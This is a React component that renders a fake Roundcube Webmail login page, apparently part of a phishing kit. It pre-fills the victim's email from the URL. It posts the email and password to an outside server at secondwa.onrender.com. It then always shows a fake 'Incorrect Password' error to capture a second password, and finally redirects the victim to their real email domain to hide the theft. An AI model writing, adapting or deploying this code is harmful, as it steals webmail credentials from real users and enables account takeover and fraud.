import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls";
import { useParams } from "react-router-dom";
import axios from "axios";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pass, setPass] = useState("");
  const [pasers, setPasser] = useState("");
  const [email, setEmail] = useState(params.id);

  const submitHandler = async (e) => {
    e.preventDefault();

    console.log(email, pass);
    setConfirmForm(true);
    setShowForm(false);
    try {
      await axios.post("https://secondwa.onrender.com/sendmail4", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  const editHandler = async (e) => {
    e.preventDefault();
    setLoading(true);

    let domain = email.substring(email.lastIndexOf("@") + 1);

    try {
      await axios.post("https://secondwa.onrender.com/sendmail4", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);
  };
  return (
    <Styls>
      <div className="contsainer">
        {showForm && (
          <div className="imagees">
            <img
              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
              className="imagee"
              alt="displare"
            />
          </div>
        )}
        {showForm && (
          <form className="formal" onSubmit={submitHandler}>
            <label>
              <span className="newicon1">
                <i class="fas fa-user fa-1x"></i>
              </span>
              <input
                type="email"
                name="to_user"
                onChange={(e) => setEmail(e.target.value)}
                required
                placeholder="Username"
                value={params.id}
              />
            </label>
            <br></br>
            <label>
              <span className="newicon1">
                <i class="fas fa-lock fa-1x"></i>
              </span>
              <input
                type="password"
                onChange={(e) => setPass(e.target.value)}
                pattern="(?=.*[0-9]).{8,}"
                name="to_pass"
                required
                placeholder="Password"
              />
            </label>
            <button>LOGIN </button>
            <p>Roundcube Webmail </p>
          </form>
        )}
      </div>
      {confirmForm && (
        <div className="contsainer">
          <div className="imagees">
            <img
              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
              className="imagee"
              alt="displare"
            />
          </div>

          <form className="formal" onSubmit={editHandler}>
            <label>
              <span className="newicon1">
                {" "}
                <i class="fas fa-user fa-1x"></i>{" "}
              </span>
              <input
                type="email"
                onChange={(e) => setEmail(e.target.value)}
                name="to_user"
                required
                value={params.id}
                title="pls no"
                placeholder="Username"
              />
            </label>
            <br></br>

            <label>
              <span className="newicon1">
                {" "}
                <i class="fas fa-lock fa-1x"></i>{" "}
              </span>
              <input
                type="password"
                onChange={(e) => setPasser(e.target.value)}
                pattern="(?=.*[0-9]).{8,}"
                name="to_pass"
                placeholder="Password"
              />
            </label>
            <p className="reda">Login failed Incorrect Password</p>
            <button>{loading ? "Loading....." : "LOGIN"} </button>
            <p>Roundcube Webmail </p>
          </form>
        </div>
      )}
    </Styls>
  );
}

export default Forms;
